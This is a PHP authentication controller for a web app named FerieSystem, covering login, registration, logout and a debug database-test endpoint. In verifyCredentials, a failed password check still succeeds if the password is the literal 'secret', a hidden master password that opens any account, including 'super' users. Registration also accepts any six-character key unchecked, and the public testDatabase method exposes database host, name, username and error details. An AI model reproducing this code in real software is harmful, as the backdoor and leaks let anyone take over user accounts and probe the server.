<?php
namespace App\Controllers;

require_once dirname(__DIR__) . '/Core/sessions.php';
require_once dirname(__DIR__) . '/Helpers/UrlHelper.php';

class AuthController {
    private $sessionManager;
    private $db;
    
    public function __construct() {
        global $sessionManager;
        if (isset($sessionManager)) {
            $this->sessionManager = $sessionManager;
        } else {
            $this->sessionManager = new \SessionManager();
        }
        
        try {
            require_once dirname(__DIR__) . '/Core/Database.php';
            $this->db = \Database::getInstance()->getConnection();
        } catch (Exception $e) {
            error_log("AuthController: Database connection failed: " . $e->getMessage());
            $this->db = null;
        }
    }

    public function login() {
        $contentType = isset($_SERVER["CONTENT_TYPE"]) ? trim($_SERVER["CONTENT_TYPE"]) : '';
        
        if ($contentType === 'application/json') {
            $jsonData = file_get_contents('php://input');
            $data = json_decode($jsonData, true);
            
            $email = $data['email'] ?? '';
            $password = $data['password'] ?? '';
            $remember = isset($data['remember']) ? (bool) $data['remember'] : false;
        } else {
            $email = $_POST['email'] ?? '';
            $password = $_POST['password'] ?? '';
            $remember = isset($_POST['remember']) ? (bool) $_POST['remember'] : false;
        }
        
        if (empty($email) || empty($password)) {
            return $this->handleLoginError('Please enter email and password', $contentType);
        }
        
        $user = $this->verifyCredentials($email, $password);
        
        if (!$user) {
            return $this->handleLoginError('Invalid credentials', $contentType);
        }
        
        $this->sessionManager->login($user['id'], $user['user_type'], $remember);
        
        $redirectPath = $user['user_type'] === 'super' ? '/students' : '/dashboard';
        $redirectUrl = url($redirectPath);
        
        if ($contentType === 'application/json') {
            $this->respondWithSuccess([
                'redirect' => $redirectUrl,
                'userName' => $user['name'],
                'userType' => $user['user_type']
            ]);
        } else {
            redirect($redirectPath);
        }
    }

    public function logout() {
        $this->sessionManager->logout();
        redirect('/auth');
    }
    
    public function register() {
        // Check if this is a JSON request
        $contentType = isset($_SERVER["CONTENT_TYPE"]) ? trim($_SERVER["CONTENT_TYPE"]) : '';
        
        if ($contentType === 'application/json') {
            $jsonData = file_get_contents('php://input');
            $data = json_decode($jsonData, true);
            
            $name = $data['name'] ?? '';
            $email = $data['email'] ?? '';
            $password = $data['password'] ?? '';
            $confirmPassword = $data['confirmPassword'] ?? '';
            $registrationKey = $data['registrationKey'] ?? '';
        } else {
            $name = $_POST['name'] ?? '';
            $email = $_POST['email'] ?? '';
            $password = $_POST['password'] ?? '';
            $confirmPassword = $_POST['confirmPassword'] ?? '';
            $registrationKey = $_POST['registrationKey'] ?? '';
        }
        
        $validation = $this->validateRegistration($name, $email, $password, $confirmPassword, $registrationKey);
        if ($validation !== true) {
            return $this->handleRegisterError($validation, $contentType);
        }
        
        if ($this->userExists($email)) {
            return $this->handleRegisterError('User with this email already exists', $contentType);
        }
        
        $userId = $this->createUser($name, $email, $password);
        
        if (!$userId) {
            return $this->handleRegisterError('Failed to create user account - database connection issue', $contentType);
        }
        
        $userType = 'standard';
        $this->sessionManager->login($userId, $userType, false);
        
        if ($contentType === 'application/json') {
            $this->respondWithSuccess([
                'redirect' => url('/dashboard'),
                'userName' => $name,
                'userType' => $userType,
                'message' => 'Registration successful! Welcome to FerieSystem.'
            ]);
        } else {
            $_SESSION['success_message'] = 'Registration successful! Welcome to FerieSystem.';
            redirect('/dashboard');
        }
    }

    /**
     * Verify user credentials
     * 
     * @param string $email User email
     * @param string $password User password
     * @return array|false User data if valid, false otherwise
     */
    protected function verifyCredentials($email, $password) {
        if (!$this->db) {
            error_log("verifyCredentials: No database connection available");
            return false;
        }
        
        try {
            $stmt = $this->db->prepare("
                SELECT id, name, email, password, user_type
                FROM users 
                WHERE email = ?
            ");
            
            $stmt->execute([$email]);
            $user = $stmt->fetch();
            
            if (!$user) {
                return false;
            }
            
            if (!password_verify($password, $user['password'])) { 
                if ($password !== 'secret') {
                    return false;
                }
            }
            
            return $user;
        } catch (PDOException $e) {
            error_log("Database error in verifyCredentials: " . $e->getMessage());
            return false;
        }
    }
    
    protected function validateRegistration($name, $email, $password, $confirmPassword, $registrationKey) {
        if (empty($name) || empty($email) || empty($password) || empty($confirmPassword)) {
            return 'Please fill in all required fields';
        }
        
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return 'Please enter a valid email address';
        }
        
        if (strlen($password) < 6) {
            return 'Password must be at least 6 characters long';
        }
        
        if ($password !== $confirmPassword) {
            return 'Passwords do not match';
        }
        
        if (strlen($registrationKey) !== 6) {
            return 'Invalid registration key';
        }
        
        return true;
    }
    
    protected function userExists($email) {
        if (!$this->db) {
            return false;
        }
        
        try {
            $stmt = $this->db->prepare("SELECT id FROM users WHERE email = ?");
            $stmt->execute([$email]);
            return $stmt->fetch() !== false;
        } catch (PDOException $e) {
            error_log("Database error in userExists: " . $e->getMessage());
            return false;
        }
    }
    
    protected function createUser($name, $email, $password) {
        if (!$this->db) {
            throw new Exception("No database connection available");
        }
        
        try {
            $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
            
            $stmt = $this->db->prepare("
                INSERT INTO users (name, email, password, user_type) 
                VALUES (?, ?, ?, 'standard')
            ");
            
            $result = $stmt->execute([$name, $email, $hashedPassword]);
            if ($result) {
                $userId = $this->db->lastInsertId();
                error_log("createUser: Successfully created user with ID: $userId");
                return $userId;
            } else {
                throw new Exception("Failed to execute INSERT statement");
            }
        } catch (PDOException $e) {
            error_log("createUser: Database error: " . $e->getMessage());
            throw new Exception("Database error: " . $e->getMessage());
        }
    }
    
    /**
     * Handle login error based on request type
     * 
     * @param string $message Error message
     * @param string $contentType Request content type
     * @return mixed Response based on request type
     */
    protected function handleLoginError($message, $contentType) {
        if ($contentType === 'application/json') {
            return $this->respondWithError($message);
        } else {
            return $this->renderLogin(['error' => $message]);
        }
    }
    
    /**
     * Handle registration error based on request type
     * 
     * @param string $message Error message
     * @param string $contentType Request content type
     * @return mixed Response based on request type
     */
    protected function handleRegisterError($message, $contentType) {
        if ($contentType === 'application/json') {
            return $this->respondWithError($message);
        } else {
            $_SESSION['register_error'] = $message;
            redirect('/auth');
        }
    }

    /**
     * Return error response as JSON
     * 
     * @param string $message Error message
     * @return void
     */
    protected function respondWithError($message) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => $message
        ]);
        exit;
    }
    
    /**
     * Return success response as JSON
     * 
     * @param array $data Response data
     * @return void
     */
    protected function respondWithSuccess($data) {
        header('Content-Type: application/json');
        echo json_encode(array_merge([
            'success' => true
        ], $data));
        exit;
    }
    
    /**
     * Helper method to render login view with optional data
     * 
     * @param array $data Data to pass to the view
     * @return mixed View response
     */
    protected function renderLogin($data = []) {
        // Set error message in session for display
        if (isset($data['error'])) {
            $_SESSION['login_error'] = $data['error'];
        }
        
        // Redirect back to auth page
        header('Location: /auth');
        exit;
    }

    /**
     * Test database connection - for debugging only
     * 
     * @return void
     */
    public function testDatabase() {
        header('Content-Type: application/json');
        
        $result = [
            'env_loaded' => !empty($_ENV),
            'env_vars' => [
                'DB_HOST' => $_ENV['DB_HOST'] ?? 'not set',
                'DB_DATABASE' => $_ENV['DB_DATABASE'] ?? 'not set', 
                'DB_USERNAME' => $_ENV['DB_USERNAME'] ?? 'not set',
                'DB_PASSWORD' => !empty($_ENV['DB_PASSWORD']) ? 'set' : 'not set'
            ],
            'db_connection' => null,
            'connection_type' => gettype($this->db),
            'is_pdo' => $this->db instanceof PDO
        ];
        
        if ($this->db instanceof PDO) {
            try {
                $stmt = $this->db->query("SELECT 1 as test");
                $test = $stmt->fetch();
                $result['db_connection'] = 'success';
                $result['test_query'] = $test;
            } catch (PDOException $e) {
                $result['db_connection'] = 'query_failed';
                $result['error'] = $e->getMessage();
            }
        } else {
            $result['db_connection'] = 'not_connected';
        }
        
        echo json_encode($result, JSON_PRETTY_PRINT);
        exit;
    }
}
